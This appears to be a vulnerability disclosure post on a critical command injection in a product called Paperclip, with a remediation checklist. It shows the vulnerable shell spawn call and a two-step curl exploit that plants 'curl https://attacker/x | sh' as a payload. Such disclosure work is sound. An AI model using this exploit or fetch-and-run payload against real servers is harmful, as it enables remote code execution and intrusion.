---
title: "OS Command Injection via Execution-Workspace cleanupCommand in Paperclip"
date: 2026-08-14
author: "Yuval Elbar"
tags: ["command-injection", "rce", "nodejs", "paperclipai"]
---

**PaperclipAI — paperclip · Critical (9.8) · CWE-78 · Fixed in 2026.416.0**

A `cleanupCommand` field on a workspace endpoint was passed straight to a shell when the workspace was archived. Five ordinary API calls turn into remote code execution as the server process.

## Where it lived

In `workspace-runtime.ts`, `PATCH /api/execution-workspaces/:id` accepted a `cleanupCommand` and stored it. When the workspace moved to **archived**, the runtime ran it through a shell:

```javascript
spawn(shell, ["-c", command]);   // command = attacker-controlled cleanupCommand
```

No validation, no allowlist, no escaping. User input reaching `-c` of a shell is the whole of CWE-78.

## Exploitation

A short, unremarkable sequence — which is what makes it easy to miss:

```bash
# plant the payload
curl -X PATCH https://target/api/execution-workspaces/$WS_ID \
  -H "Content-Type: application/json" \
  -d '{"cleanupCommand": "curl https://attacker/x | sh"}'

# archive to trigger it
curl -X PATCH https://target/api/execution-workspaces/$WS_ID \
  -H "Content-Type: application/json" -d '{"status": "archived"}'
```

(Discover the company, find the workspace, reactivate if needed, inject, archive.) The result is code execution as the server, and from there the usual: exfiltration, lateral movement, persistence.

## The fix

The remediation is the standard checklist for any "run a command" feature: use `execFile(bin, [args])` with an argument array instead of a shell string, allowlist the operations, validate inputs, add authorization on the transition, and sandbox anything that genuinely must run. If you must run external programs, pass an executable plus an args array — never build a string for a shell.

## Disclosure

Reported through GitHub Security Advisories; fixed in 2026.416.0.

## References

- [GHSA-vr7g-88fq-vhq3](https://github.com/paperclipai/paperclip/security/advisories/GHSA-vr7g-88fq-vhq3) · [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
